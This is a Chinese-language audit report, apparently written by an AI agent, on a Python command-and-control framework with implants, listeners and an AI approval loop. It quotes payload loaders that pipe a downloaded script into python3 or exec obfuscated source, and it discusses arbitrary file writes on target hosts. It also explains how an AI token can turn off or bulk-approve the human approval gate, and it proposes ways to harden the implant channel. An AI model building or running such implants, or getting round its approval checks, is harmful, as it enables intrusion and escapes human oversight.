# PyExec2-Rebuild 认证 / API / 传输 / 载荷 / 任务引擎 只读审计报告

> Post-audit status (2026-11-25): several findings in this report were remediated after the audit. See `docs/FULL_SYSTEM_TEST_REPORT.md` for the final pass/fail matrix, fixes and remaining limitations. This file is retained as the original read-only audit evidence.


- 审计对象：`<PROJECT_ROOT>`（版本 0.1.0，FastAPI + asyncio 传输插件 + 纯 Python ChaCha20-Poly1305）
- 审计方式：**只读代码审计**（read-only）。未修改任何源码、未启动/停止任何进程、未清理任何数据；所有结论均以源码行号为证据，命令证据见文末「附录 A」。
- 审计时间：2026-11-25
- 覆盖模块：`server_core/app.py`、`config.py`、`runtime.py`、`crypto.py`、`payload_builder.py`、`task_engine.py`、`listener_manager.py`、`bootstrap.py`、`implant_runtime.py`（网络部分），`transport_plugins/{udp,tcp,http,https,dns}.py`，落盘配置 `config/*`、`data/*`、`runtime/active_payloads/*`。

## 0. 结论摘要

| # | 严重级别 | 一句话结论 |
|---|---|---|
| C-1 | **Critical** | `/p/{token}` 免鉴权下发**含明文会话密钥**的完整载荷源码：拿到 URL 即等于拿到 C2 全部流量的解密密钥 + 伪造 Beacony 能力 |
| C-2 | **Critical** | 「AI 审批闭环」默认关闭（`all_allow`）且可被 AI 自身切换；`approval.approve_all` 可一次性批量批准全部高危动作，审批无 TTL/无二次鉴权 |
| H-1 | High | 载荷交付链路是「zlib + base64 + 单字节 XOR 0x5A」混淆，**不是加密**；`/p/` 走明文 HTTP |
| H-2 | High | 植入体 HTTPS 客户端 `ssl._create_unverified_context()`，TLS 证书校验被整体关闭 |
| H-3 | High | HTTP Listener 无鉴权、无 Host 校验、Content-Length 无上限（内存 DoS）；`/api/implant/poll` 同样无速率与体积限制 |
| H-4 | High | 传输层无防重放 / 无时间戳 / 无 beacon↔源 IP 绑定；抓到一个合法 poll 即可重放或冒充植入体领取任务 |
| H-5 | High | `file.upload` / `file.upload_chunk` 对 `path`、`content_b64` 无校验，任意远端写路径 + 无限体积 |
| H-6 | High | 单一 Bearer token 授予全部权限：无 scope、无角色隔离（human token 可写插件/改配置/审批一切），token 用 `==` 比较 |
| M-1 | Medium | DNS 传输只处理 `index==0`，`total` 被丢弃 → 多包/大响应无法下发；TXT 分片硬编码 180 字节 |
| M-2 | Medium | 结果分片无状态机保护：chunk 可覆盖、`chunk_total` 变更可永久卡单、已判定任务可被重复写结果 |
| M-3 | Medium | 载荷密钥与源码明文落盘 `runtime/active_payloads/*.json`（实测 0644），重启重连即靠该明文文件 |
| M-4 | Medium | 审批记录与上传内容明文落盘 `data/approvals/*.json`，无清理/TTL；`_purge_payload_history` 静默 `rmtree` 不可审计 |
| M-5 | Medium | `handle_action` 把 `异常类名: 详情` 原样返回给调用方，泄露内部路径与实现细节 |
| L-1 | Low | 401 响应空 body + 无失败计数/锁定；token 比较非常量时间 |
| L-2 | Low | token 与 SOCKS5 凭据直接打印到 stdout（`bootstrap.py`），随日志/终端历史外泄 |
| L-3 | Low | `detect_local_ip()` 生成载荷时会向 8.8.8.8 发起探测连接（离线环境会得到错 IP） |
| L-4 | Low | HTTPS Listener 使用固定证书、未设 `minimum_version`；`readuntil(b"\r\n\r\n")` 无上限（慢速 header 攻击） |

**总体判断**：协议层 AEAD 实现本身（`crypto.py`）是正确且常量时间比较的，但**密钥分发模型是根本性缺陷**——载荷把对称密钥直接内嵌并以（弱混淆的）源码形式公开分发，因此「加密」只对抗被动旁路观察者，无法对抗任何拿到载荷 URL 的一方；再叠加审批默认全放行、上传任意写、TLS 校验关闭，整条 C2 控制面在"操作员网络被旁路"或"AI token 泄露"两种场景下都可被完整接管。

---

## 1. 服务端认证与 API（`server_core/app.py`）

### C-1【Critical】`/p/{token}` 免鉴权下发含明文密钥的载荷源码

**位置**：`server_core/app.py:92-99`、`server_core/payload_builder.py:82-83,92-104,117,134-140`、`server_core/runtime.py:222-223`

```python
# app.py:92-99
@app.get("/p/{token}")
def public_payload(token: str):
    record = runtime.payload_by_token(token)     # 仅校验 token 存在
    source = runtime.payload_source(record["id"])
    return PlainTextResponse(source, media_type="text/x-python")   # 完整源码
```

载荷源码由 `payload_builder.generate()` 生成，`config` 字典在 `payload_builder.py:74-91` 中包含：

- `payload_token`（同时也是 `/p/` 的路径 token）
- `key_b64 = base64(secret)`（**32 字节对称密钥，即整个 C2 会话的 AEAD 密钥**）
- `beacon_id`、`host`、`port`、`protocol`、心跳参数

随后 `source = self._template().replace("__CONFIG_JSON__", repr(config))`（`payload_builder.py:92`）——密钥以 Python 字面量形式写进载荷正文。

**影响边界**：
1. 任何获得 `/p/<token>` URL 的一方（URL 会进入 Web 服务器访问日志、代理日志、浏览器/下载器历史、`Referer`、共享剪贴板、聊天记录）都能读出 `key_b64`；
2. 持有该 key 可以：解密任意被抓到的 poll 请求与响应（任务指令、执行结果）；构造合法 `transport_poll` 请求冒充植入体领取任务队列；解密历史流量（同一载荷生命周期内密钥不变）。
3. `/p/` 无 TTL、无下载次数上限、无 UA/IP 绑定、无 `Cache-Control: no-store`（对比 `payload_builder.py:129` 的 `downloads` 计数只自增不限制）。

**复现思路（只读、非破坏）**：
1. 以 human token 调用 `POST /api/action {"action":"payload.generate","args":{"listener_id":"<任一听听器>"}}`，返回体即含 `download_url`；
2. `curl -fsSL "http://<host>:<port>/p/<token>"` → 响应正文中可见 `'key_b64': '<base64>'`、`'beacon_id': '...'`（**无需任何 Authorization 头**）；
3. 用 `crypto.derive_key` 之外的原始 32 字节 key 调用 `open_seal(key, base64.b64decode(data), b"pyexec2-implant")` 即可解出任意 poll 明文。

**建议修复**：
- 载荷内**不再内嵌密钥**：改为内嵌 `beacon_id` + 由服务器主密钥单向派生的 KDF 种子（`HKDF(server_master, salt=beacon_id, info="implant-v1")`），会话密钥只在服务器内存中派生；
- `/p/{token}` 改为一次性、短 TTL（≤5 min）、一次性消费（首次下载后立即失效）、绑定 `User-Agent`+来源 IP、`Cache-Control: no-store`，并把 token 与密钥彻底解耦（token 泄露 ≠ 密钥泄露）；
- 若必须支持重装/重连，走"植入体上线时用 X25519 临时公钥协商会话密钥"（当前完全没有密钥协商，见 §4）。

### H-6【High】单一 Bearer token = 全权限；无 scope、无角色隔离；非常量时间比较

**位置**：`server_core/app.py:20-24,47-56`；`server_core/runtime.py:279-296`

```python
if token and token == runtime.settings.token:      # 非常量时间比较
    return "human"
if token and runtime.settings.ai_token and token == runtime.settings.ai_token:
    return "ai"
if token and runtime.settings.ai_approval_token and token == runtime.settings.ai_approval_token:
    return "ai_approval"
```

- 三种 token 只有"值不同"，**没有任何 scope 概念**：human 可做全部（含写插件 `plugin.save`、`server.config.set`、审批）；`ai` token 在 `all_allow` 模式下等价于 human（见 C-2）。
- token 比较用 `==`（非 `secrets.compare_digest`），理论上存在时序侧信道（本地/内网可利用性低，但这是低成本修复项）。
- 无失败计数、无锁定、无 IP 白名单、无 token 轮换接口；`/health`、`/`、`/api/session`、`/api/action` 全部共用同一 token，泄露面天然放大。

**建议**：改为 `secrets.compare_digest`；引入 scope（如 `read` / `task` / `admin` / `approval`）并在 `_dispatch` 前按 action 校验；token 支持轮换与"上一代 token 宽限期"；对 401 做失败计数与锁定。

### L-1【Low】401 空响应、无审计友好度

**位置**：`server_core/app.py:36-39`

```python
if exc.status_code == 401:
    return Response(status_code=401, content=b"", headers={"WWW-Authenticate": "Bearer"})
```

空 body 导致：客户端无法区分"token 无效/被轮换/权限不足"；SIEM 侧只能靠状态码；配合无速率限制，爆破成本为零。建议返回结构化 `{"error":"invalid_token"}`（不含敏感信息），并记录来源 IP + 失败次数。

### L-2【Low】token / 代理凭据打印到 stdout

**位置**：`server_core/bootstrap.py:21-30`

```python
print(f" Human:   {settings.token}")
print(f" AI Work: {settings.ai_token}")
print(f" AI Appr: {settings.ai_approval_token}")
print(f" SOCKS5:  ... user={runtime.proxy.username} pass={runtime.proxy.password}")
```

启动日志/screen/tmux scrollback/CI 日志都会留存明文 token 与 SOCKS5 凭据。建议只在 TTY 且显式 `--show-tokens` 时打印，其余情况打印指纹（sha256 前 8 位）。

---

## 2. AI 审批闭环（`runtime.py`）——**闭环不成立**

### C-2【Critical】默认 `all_allow` + AI 可自降策略 + 批量批准无门槛

**位置**：`server_core/runtime.py:18-44`（白名单）、`:54-58`（默认配置）、`:114-122`（改模式）、`:283-289`（审批门控）、`:650-714`（审批记录与批准）

```python
# 54-58：首次启动默认全放行
config = {"approval_mode": "all_allow", "workdir": str(self.settings.workdir)}

# 283-289：只有 per_action 模式才拦
if actor in {"ai", "ai_approval"} and self.approval_mode == "per_action" \
        and action not in READ_ONLY_ACTIONS and not action.startswith("approval."):
    approval = self._create_approval(action, args, actor)
    return {"status": "approval_required", "approval": approval}
```

闭环缺陷清单：
1. **默认不审批**：`all_allow` 下 `ai` token 可 `task.create` / `script.run` / `file.upload` / `plugin.save` / `listener.create`，`handle_action` 直接 `_dispatch`；
2. **AI 可自己关门**：`set_approval_mode`（`runtime.py:114-122`）通过 `server.config.set` 暴露，任何持有 `ai` 或 `human` token 的进程都能把 `per_action` 改回 `all_allow`，且该动作本身在 `per_action` 模式下**不在白名单里、但也不是 `approval.*`**，会被拦一次——然而一旦被批准，后续永久放开；
3. **`approval.approve_all` 是单点放大器**（`runtime.py:672-680`）：持 `ai_approval` token 一次调用即可批准全部 pending，无二次确认、无高危项过滤（`file.upload` 与 `task.create` 同级）；
4. **审批不绑定内容**：`_create_approval` 存 `action + args` 快照（`650-662`），`_approve_approval` 直接 `_dispatch(record["action"], record["args"])`（`698`），**没有对 args 做哈希/签名校验，也没有过期时间**——磁盘上的 `data/approvals/*.json` 被改一条就能批准任意内容（文件权限见 M-4）；
5. **审批可无限期滞留**：`_list_approvals` 无分页、无 TTL、无归档。

**复现思路**：
- 路径 A（默认即可绕过）：以 `ai` token 发 `{"action":"task.create","args":{"beacon_id":"<在线>","plugin":"ls"}}` → 返回 `status=ok`，无审批单产生；
- 路径 B（批处理放大）：切到 `per_action` 后，制造多条 pending，再以 `ai_approval` token 调 `{"action":"approval.approve_all"}` → 全部 `approved` 并已执行。

**建议修复**：默认 `per_action`；`ai` token 禁止调用 `server.config.set` / `plugin.save` / 审批类动作；`approval.approve_all` 仅 human 可用或直接删除；审批单增加 `args_sha256` + `expires_at` + 一次性 nonce，批准时校验哈希；高危动作（上传、脚本、插件）要求 human 双人（或 human + 硬件密钥）。

---

## 3. 载荷生成 / 下载 / 加密（`payload_builder.py`、`crypto.py`）

### H-1【High】"加密"实为压缩 + base64 + 单字节 XOR

**位置**：`payload_builder.py:97-104,156-167`

```python
compressed = zlib.compress(source.encode("utf-8"), 9)
b64 = base64.b64encode(compressed).decode()
one_liner = 'import base64,zlib;exec(zlib.decompress(base64.b64decode("' + b64 + '")))'   # 无加密
curl_method = f'curl -fsSL "{download_url}" | python3'                                   # 明文 HTTP

def _short_loader(url):
    key = 0x5A
    obfuscated = bytes(byte ^ key for byte in url.encode("utf-8"))   # 单字节 XOR
```

- `direct_echo` / `curl` / `short_downloader` 三种投递方式全部是**可逆混淆**：zlib 解压即得完整源码（含 `key_b64`）；`0x5A` 单字节 XOR 对 URL 不提供任何机密性；
- `download_url` 使用 `settings.base_url`（`config.py:26-28`）——固定 `http://`，即 **C2 引导流量是明文**，中间人可替换载荷（植入任意代码到目标机）；
- `/p/` 响应 `media_type="text/x-python"`，无完整性签名（`server.cfg` 里也无 ed25519/HMAC 校验机制）。

**建议**：载荷投递阶段就用「一次性密钥 + AEAD」封装（例如把 zlib 压缩体用 `seal(one_time_key, ...)` 封装，one_time_key 只在首次下载时通过 TLS 交付）；`base_url` 支持 `https://` 且默认 HTTPS；提供可选的 Ed25519 签名，植入体先验签再 `exec`。

### M-3【Medium】载荷密钥与源码明文落盘、重启即靠明文恢复

**位置**：`payload_builder.py:144-154`、`runtime.py:67-82`、实测 `runtime/active_payloads/*.json`

```python
path = directory / f"{token}.json"
tmp.write_text(json.dumps({"record": record, "source": source}, ...))   # 含 key_b64 + 完整源码
```

实测（`c126_mwv3tftirw8n`）：`runtime/active_payloads/` 下存在多个 60KB 级 JSON，权限 `-rw-rw-r--`（0644，同组与其他用户可读），文件名即 `/p/` 的 token。也就是说同机低权用户可枚举 token 并直接读到密钥，**绕过 C-1 的"需要知道 URL"前提**。`_persist_active_payload` 未做 `chmod 600`，也未加密静态存储。

**建议**：`chmod 600`（创建时 `os.open(..., 0o600)`）；`key_b64` 不落盘（服务器主密钥派生即可重建）；或对整个文件做 AES-GCM 封装，密钥来自 keyring/DPAPI。

### L-3【Low】生成载荷触发对外探测连接

**位置**：`listener_manager.py:14-32` `detect_local_ip()` 连接 `8.8.8.8:80`；在 `create()`（`:67-70`）与 `list()`（`:174-180`）中被调用。离线/受限网络下会得到错误 IP（回退 `socket.gethostbyname(hostname)` 常给出 127.0.1.1），导致载荷回连错误地址；同时"生成载荷"这一动作产生可观测的对外流量。

**建议**：优先使用配置项 `public_host`；无配置时用 `ip -j route get 1.1.1.1`/仅本地接口枚举，禁止主动外连。

---

## 4. 密钥协商方式（**审计结论：不存在协商**）

**事实**：
- 唯一"密钥交换"是 `payload_builder.generate()` 内 `secret = secrets.token_bytes(32)`（`payload_builder.py:51`），直接 `base64` 后写进载荷（`:83`、`:117`）——即**服务器预共享密钥 + 明文分发**；
- 载荷生命周期内**密钥永不轮换**；`transport_poll` 每次都用同一 `key`（`runtime.py:180`）；
- AEAD 的 AAD 是**常量** `b"pyexec2-implant"` / `b"pyexec2-server"`（`runtime.py:182,219`），没有绑定 `beacon_id`、消息类型、计数器或时间戳 → 跨 beacon 的密文可互换（同一 key 下），也不抗重放；
- `crypto.py` 本身实现质量尚可：RFC 8439 ChaCha20-Poly1305、`os.urandom(12)` nonce、Poly1305 常量时间比较（`crypto.py:120-126`）、`derive_key = sha256(salt:secret)`（`crypto.py:86-89`，可接受但非 KDF）。

**修复建议**：
1. 引入真正的密钥协商：植入体首次上线携带 X25519 临时公钥（或 Noise IK / WireGuard Noise_XX 风格握手），服务器回临时公钥，双方 `HKDF(shared_secret, info=beacon_id||version)` 派生会话密钥；
2. 会话密钥按小时或按 N 次消息轮换（rekey 消息）；
3. AAD 改为 `beacon_id || msg_type || seq || timestamp`，并在服务器侧维护 `seq` 滑窗拒绝重放（见 H-4）；
4. 保留 `crypto.py` 实现，但不要再把密钥放进载荷。

---

## 5. 传输插件（UDP / TCP / HTTP / HTTPS / DNS）

### 5.1 横向矩阵

| 维度 | UDP (`udp.py`) | TCP (`tcp.py`) | HTTP (`http.py`) | HTTPS (`https.py`) | DNS (`dns.py`) |
|---|---|---|---|---|---|
| 鉴权 | 仅 `payload_token` + AEAD | 同左 | 同左（另有 URL 路径白名单） | 同左 | 同左（要求 `*.c2.local`） |
| 传输机密性 | AEAD（密钥见 C-1） | AEAD | AEAD，但外层 JSON/base64 明文 | AEAD + TLS（**植入体不验证书**，H-2） | AEAD，但域名/查询明文可枚举 |
| 防重放 | 无 | 无 | 无 | 无 | 无 |
| 请求体积上限 | 无（受 MTU） | 64MB（`tcp.py:23`） | **无**（`http.py:23-26`） | 同 HTTP | 无 |
| 异常处理 | 全吞（`udp.py:28`） | 仅 3 类异常（`:31`） | 全吞 + 400（`:47-52`） | 同 HTTP | 全吞（`:76`） |
| 分片/大结果 | 不适用 | 单连接串行 | 单请求 | 单请求 | **仅 index 0，无法多包**（M-1） |
| 监听默认地址 | 0.0.0.0（`udp.py:36`） | 0.0.0.0（`tcp.py:44`） | 0.0.0.0（`http.py:64`） | 0.0.0.0（`https.py:27`） | 0.0.0.0（`dns.py:84`） |

实测监听器落盘（`c126_mwv3tftirw8n`）：5 个 listener 全部 `status=listening`，`host=0.0.0.0`（udp 除外为具体网卡），端口 19121-19124/19000，`public_host=192.0.2.10`——**全部公网可达，无来源白名单**。

### H-3【High】HTTP Listener 无鉴权、无体积上限、无 Host 校验

**位置**：`transport_plugins/http.py:13-26,29-58`

```python
data = await reader.readuntil(b"\r\n\r\n")        # 无上限 → 慢速 header 占连接
length = int(headers.get("content-length", "0"))
while len(body) < length:                          # 无上限 → 内存耗尽
    body += await reader.read(length - len(body))
```

- 任何能连到端口的进程都可 `POST /poll`，只要提供有效 `payload_token` + 合法 AEAD 即被受理（这层没问题），但**前置的 JSON 解析、base64 解码、超大 body 缓冲都在鉴权之前**；
- 无 `Host` 校验 → 可被 DNS rebinding 打内网；无并发连接数限制；
- `json.loads` 失败会走 400 空响应（`http.py:49`），观测性差。

**建议**：`asyncio.start_server(limit=...)` + 显式 `Content-Length <= 1MB`；校验收到的 `Host` 与 listener 配置一致；加连接数与每 IP 速率限制；`/poll` 路径之外一律 404（已有），但应记录被拒原因。

### H-4【High】无防重放 / 无 beacon↔来源绑定

**位置**：`runtime.py:177-220`

`transport_poll` 只做 `token` 查找 + AEAD 解密，没有：
- 单调序号/时间戳校验（同一合法包可无限重放，`record_result` 会反复覆盖结果、`claim_tasks` 会反复弹出任务）；
- 来源 IP 与 beacon 绑定（`_touch_beacon` 不比较 `request.client`）；
- 请求去重（`result_id` 只在响应里 ack，不落库查重）。

**建议**：BEACON 侧维护 `seq` 滑窗（服务器持久化 `last_seq`），AEAD AAD 加入 `seq+timestamp`，拒绝 `|now - ts| > 300s`；将 beacon 首次上线 IP 记录为软绑定并告警变更。

### H-2【High】HTTPS 植入体关闭证书校验；服务端固定证书

**位置**：`server_core/implant_runtime.py:278-284`

```python
if scheme == "https":
    context = ssl._create_unverified_context()      # 证书校验被整体关闭
with urllib.request.urlopen(req, timeout=30, context=context) as response:
```

- 植入体侧：任何中间人（代理/网关/ARP/DNS 劫持）都能替换响应体 → 伪造任务、注入结果、窃取 `payload_token`；
- 服务端侧：`https.py:16-21` 每次 `start` 都从 `config/server.crt|server.key` 加载**同一张固定证书**，无轮换、未设 `minimum_version`（默认 TLS1.2 起，但未显式约束）、`server.key` 虽为 0600（实测）但无 HSM/无密码保护。

**建议**：植入体侧改为 `ssl.create_default_context()` 并 pin 服务器证书指纹（把 leaf 证书 SHA256 内嵌进载荷）；服务端证书与密钥走 ACME/内部 CA 并支持热轮换；`context.minimum_version = TLSVersion.TLSv1_2`。

### M-1【Medium】DNS 传输只能单包，无法下发大响应

**位置**：`transport_plugins/dns.py:57-77`

```python
total = int(body_labels[0])
index = int(body_labels[1])
if index != 0:
    return                      # 只处理第一片，其余全部丢弃
...
answer = base64.b32encode(...)  # 响应无尺寸控制
packet = _txt_response(qid, labels, answer)
```

- `total` 解析后未使用，`index != 0` 直接 return → 客户端无法分片上传；
- 响应侧 `_txt_response` 按 180 字节切 TXT（`:37`），但整包仍走单个 UDP 报文，超过路径 MTU 会被分片或丢弃；base32 编码使体积膨胀 1.6×；
- DNS 传输的域名查询本身（`<total>.<index>.<b32>.c2.local`）在被动 DNS 日志中泄露 `total/index` 与长度分布。

**建议**：实现真正的多包重组（`index`/`total` + 服务器侧缓存 + 超时清理）；响应侧按 MTU 自适应分片并让客户端轮询；对标签长度与编码长度做上限校验。

### M-2【Medium】结果分片与任务状态无保护

**位置**：`task_engine.py:203-255`

- `record_result_chunk`：`chunk_index` 可被重复覆盖（同一 part 文件直接 `write_bytes`）；`chunk_total` 若中途变化（第 2 包报 total=3，第 3 包报 total=99），任务将**既无法完成也无法失败**（无超时、无清理）；`chunk_hash` 只在凑齐后校验一次，失败则 `rmtree`（`:216-218`）——攻击者可反复触发"凑齐→hash 错→删除"，造成无限重传；
- `record_result`（`:229-255`）**不校验任务当前状态**：已 `succeeded` 的任务可被再次写入新结果并覆盖 `task.json`（伪造执行结果）；任何持有 `payload_token` 的一方（见 C-1）都能对任意 `task_id` 写结果。

**建议**：`record_result_chunk` 校验 `chunk_total` 一致性、写入前校验 `task.status in {dispatched, started}`、分片目录加 TTL 清理；`record_result` 加幂等键（`result_id` 唯一索引）与状态机校验（`succeeded` 后再写需 `force` + 审计）。

### 5.2 其他传输层问题

- **UDP/DNS 全异常吞掉**（`udp.py:28-29`、`dns.py:76-77`）：攻击探测无法从日志发现；建议至少 `logger.debug(..., exc_info=True)` 或计数指标。
- **TCP 单连接串行 + 64MB**（`tcp.py:20-31`）：单连接一次只处理一个请求，`length` 超限直接 `return`（静默断链），无 `keepalive` 配置。
- **HTTPS 复用 HTTP 的 handler**（`https.py:5,26`）：`handle_client` 里没有 TLS 客户端证书校验，HTTPS 只是"加密管道"，鉴权仍是 token。

---

## 6. TaskEngine / 上传 / 任意写

### H-5【High】`file.upload` / `file.upload_chunk` 无路径与体积校验

**位置**：`runtime.py:614-648`；下游插件 `implant_plugins/linux/ldd.py`、`windows/wdd.py`

```python
path = str(args.get("path", ""))
b64 = str(args.get("content_b64", ""))
data = base64.b64decode(b64)                       # 无上限 → 内存膨胀
...
self.store.write_bytes(f"artifacts/{artifact_id}.bin", data)
task = self.tasks.create_task(..., args={"op": "write", "path": path, "mode": "start", ...})
```

- `path` 未经 `normpath`/白名单/根目录约束，直接作为插件参数下发到 beacon 端 `dd`（或 `wdd`）执行 → **目标机任意路径写**（含覆盖 `/etc/ld.so.preload`、`~/.ssh/authorized_keys`、cron 等）；
- `content_b64` 无大小限制，`base64.b64decode` 一次性展开 + `write_bytes` 落盘 → 服务端与 beacon 双向内存/磁盘 DoS；
- `_upload_file` 把内容另存 `artifacts/<id>.bin`，同样无权限收紧（实测 `data/artifacts/` 为 0775 目录）。

**建议**：`path` 归一化后必须落在配置的 `upload_root` 之下（`Path.resolve().is_relative_to(root)`）；限制单文件与单请求体积；分块上传校验 `offset` 连续性；artifacts 目录 0600/0700。

### 状态机与审计缺口

- `task_engine.py:162-201` `claim_tasks` 先写队列文件再逐条改状态，**非事务**：中途异常会丢任务（队列已截断、状态仍 queued 则永久卡住）；
- `_public()` 只过滤 `source`（`:280-282`），但 `get_task` 直接返回 `result`（`:148-160`），结果内容无脱敏；
- `create_task` 把插件源码整段写进 `data/tasks/<id>/task.json`（`:44-67`），结合 M-4 的 0775 目录，同机用户可读全部下发指令。

---

## 7. ListenerManager / ServerRuntime 生命周期（重启重连）

### M-6【Medium】启动即恢复全部监听，默认 0.0.0.0，无 TLS/来源约束

**位置**：`listener_manager.py:58-96`（create）、`:191-208`（`start_all`）、`bootstrap.py:31`

- `bind_host = host or "0.0.0.0"`（`:64`）：不填就是全网卡；
- `start_all()` 在服务器启动时**无条件**对所有 `status in {listening, starting}` 的记录重新 bind，失败则写 `failed`——这意味着任何一次"危险配置"在重启后被自动复活，且失败仅落 JSON 不告警；
- `restart()`（`:124-134`）先 `pop` handle 再 stop，若 `stop` 抛异常则 handle 已丢失 → 端口泄漏（后续 bind 失败），且 `stop_all`（`:210-220`）不持久化 `stopped` 状态（注释说这是刻意的），运维无法从记录区分"用户停的"和"进程崩溃停的"。

**建议**：默认 `127.0.0.1`，需显式 `--bind-public` 才监听 0.0.0.0；`start_all` 前做配置校验（端口冲突、证书存在、协议白名单）并对失败发事件告警；`restart` 用 `try/finally` 保证 handle 与端口状态一致；`stop_all` 增加 `shutdown_reason` 字段。

### M-4【Medium】审批/载荷/事件明文落盘，purge 不可审计

**位置**：`runtime.py:91-102`

```python
payloads_dir = self.settings.data_dir / "payloads"
if payloads_dir.exists():
    shutil.rmtree(payloads_dir, ignore_errors=True)      # 静默删除历史
```

- `data/` 目录实测 0775，`approvals/` 内含完整动作与参数（含上传内容），`events/` 含 `action.completed` 的 args 全量（`runtime.py:292`）——**指令、路径、文件内容全部明文留痕**；
- `_purge_payload_history` 静默 `rmtree`，无法复盘"哪些载荷被销毁"。

**建议**：`data/` 权限收紧为 0700；事件里的 `args` 做敏感字段脱敏（`content_b64` → 长度+hash）；purge 改为"归档 + 审计事件"，保留 tombstone。

### L-4【Low】HTTPS 固定证书 / HTTP 慢速 header

见 H-2 与 5.1 表；`http.py:14` 的 `readuntil` 无 `limit`，`asyncio` 默认 64KB 限制会在超长 header 时抛 `LimitOverrunError` → 连接被 finally 关闭，但仍可被用于占满连接槽（无连接上限）。

---

## 8. 修复优先级建议（P0→P3）

| 优先级 | 事项 |
|---|---|
| **P0（立即）** | ① 载荷不再内嵌密钥（C-1/§4）；② `/p/{token}` 一次性+TTL+no-store+IP 绑定；③ `runtime/active_payloads/*.json` chmod 600 且不存 key；④ 上传 `path` 强制落在 `upload_root` 内 + 体积上限（H-5） |
| **P1（本轮迭代）** | ⑤ 默认 `per_action`，AI 禁止改配置/批量批准，审批加 `args_sha256`+TTL（C-2）；⑥ 载荷投递走 HTTPS + 客户端固定证书（H-1/H-2）；⑦ HTTP Listener 加 body/header 上限与 Host 校验（H-3）；⑧ 传输层加 `seq+timestamp` 防重放（H-4） |
| **P2（下轮）** | ⑨ DNS 多包重组、结果分片状态机与幂等（M-1/M-2）；⑩ token scope 化 + 常量时间比较 + 失败锁定（H-6/L-1）；⑪ `start_all` 配置校验与默认 `127.0.0.1`（M-6）；⑫ `data/` 0700 + 事件脱敏（M-4） |
| **P3（卫生项）** | ⑬ 不再打印 token/SOCKS5 凭据（L-2）；⑭ `detect_local_ip` 不再外连 8.8.8.8（L-3）；⑮ `handle_action` 错误信息脱敏（M-5）；⑯ 异常日志与指标（5.2） |

---

## 附录 A：本次审计的命令证据（全部只读）

| commandId | 用途 |
|---|---|
| `c90_mwv3qr5h7jei` | 项目结构盘点（顶层目录、`docs/` 现状） |
| `c94_mwv3r075936c` | 按行数列出源文件（排除 node_modules），确定优先级 |
| `c95_mwv3r08c6g54` | 入口 `run.py`/`pyproject.toml` + 核心模块文件清单 |
| `c98_mwv3r3xpvemc` | Python 源文件行数统计 |
| `c99_mwv3r3ycvoth` | 通读 `server_core/app.py`（路由、鉴权、`/p/{token}`、401 处理器） |
| `c102_mwv3ramnfx5g` | `runtime.py` 函数/类骨架 |
| `c103_mwv3rana1kod` | 通读 `crypto.py`（ChaCha20-Poly1305 实现质量） |
| `c106_mwv3rievgyfj` | `ServerRuntime.__init__` / 载荷持久化 / 审批模式默认值 |
| `c107_mwv3rifjmcy7` | `transport_poll` / `payload_by_token` / beacon 心跳 / `handle_action` |
| `c110_mwv3rrmhy14d` | `config.py`（token 生成、默认 host/port、base_url） |
| `c111_mwv3rrn66psh` | `payload_builder.py`（密钥内嵌、混淆投递、落盘） |
| `c114_mwv3rwngy8dm` | 5 个传输插件通读 |
| `c115_mwv3rwo5k0f5` | `task_engine.py` 通读（认领/分片/结果） |
| `c118_mwv3s6x64r4s` | `listener_manager.py` 通读（绑定、重启、`start_all`） |
| `c119_mwv3s6xwju0j` | 审批闭环 + 上传实现（`runtime.py:579-714`） |
| `c122_mwv3sykcpdm9` | `APPROVAL_DECISION_ACTIONS`/`READ_ONLY_ACTIONS` 白名单与 action 路由表 |
| `c123_mwv3syl2x0j0` | `implant_runtime` 网络行为（TLS 校验、超时）+ `bootstrap.py` |
| `c126_mwv3tftirw8n` | 落盘权限实测：`config/`、`data/*token*.txt`、`runtime/active_payloads/*.json`、5 个 listener 绑定 |

> 纪律说明：本轮为**纯静态审计**，未启动/重启服务、未对任何 listener 发包、未修改源码或数据；所有"复现思路"均为代码路径推演，可在独立测试实例上安全复现（除 C-1 需注意不要在共享环境泄露真实 token）。
